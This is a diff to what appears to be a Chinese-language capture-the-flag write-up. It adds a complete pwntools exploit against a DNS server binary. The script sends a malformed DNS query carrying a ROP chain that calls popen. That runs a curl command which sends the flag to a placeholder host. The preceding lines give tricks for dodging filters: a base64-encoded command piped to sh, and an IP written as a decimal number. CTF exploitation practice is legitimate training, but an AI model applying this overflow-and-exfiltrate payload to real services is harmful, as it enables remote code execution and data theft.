@@ -85,3 +85,68 @@ call popen;
 
 1. Mark佬的方法，我们先将反弹flag命令用base64编码，比如说编码后的结果为`ABCD==`，那么`payload`就为`echo ABCD==|base64 -d|sh`
 2. 鄙人的方法，其实ip可以写成10进制的方式，`1.2.3.4`转化为10进制的方法是`4+3*256+2*256^2+1*256^3`，结果为`16909060`，代替正常命令中的ip即可
+
+### 完整exp
+```python
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+from pwn import *
+context(arch='i386')
+# context.terminal=['tmux','splitw','-h']
+
+context.log_level = 'debug'
+
+
+local = 0
+_elf = './dns'
+_libc = ''
+_addr = '127.0.0.1'
+_port = 9999
+
+
+def getConn():
+    if local == 1:
+        return process(_elf)
+    else:
+        return remote(_addr, _port, typ='udp')
+
+
+def debug(p, cmd=None):
+    gdb.attach(p, cmd)
+    pause()
+
+
+r = process([_elf, '-C', './dns.conf'])
+pause()
+
+
+
+p = getConn()
+elf = ELF(_elf)
+ret=0x0804a00e
+syscall=0x08054e54
+p_eax=0x08059d44
+
+str_r=0x80a650c
+
+popen=0x08071802
+
+pay=b''
+pay+=(b'\x3f'+b'\xff'*0x3f)*14 #0x380
+pay += b'\x3f'*2+p32(0xdeadbeef)+(p32(0x08059d44)+p32(0xffffffff-0x1f)+p32(0x0804b639)+p32(0xdeadbeef)*6+p32(0x0807ec72)+p32(str_r)+p32(popen)).ljust(0x3f-5, b'\xff')
+pay += b'\x1f'+b'curl xxx:xxx/`cat flag`'  # 这里的0x1f为后面指令的长度+1(包含下一行的\x00)
+pay += b'\x00'
+
+
+
+payload = b''
+payload += b'\xde\xad'  # ID
+payload += b'\x01\x20'  # Flags
+payload += b'\x00\x01\x00\x00\x00\x00\x00\x01'
+payload += pay
+payload += b'\x00\x01'
+payload += b'\x00\x01'
+
+p.send(payload)
+p.interactive()
+```
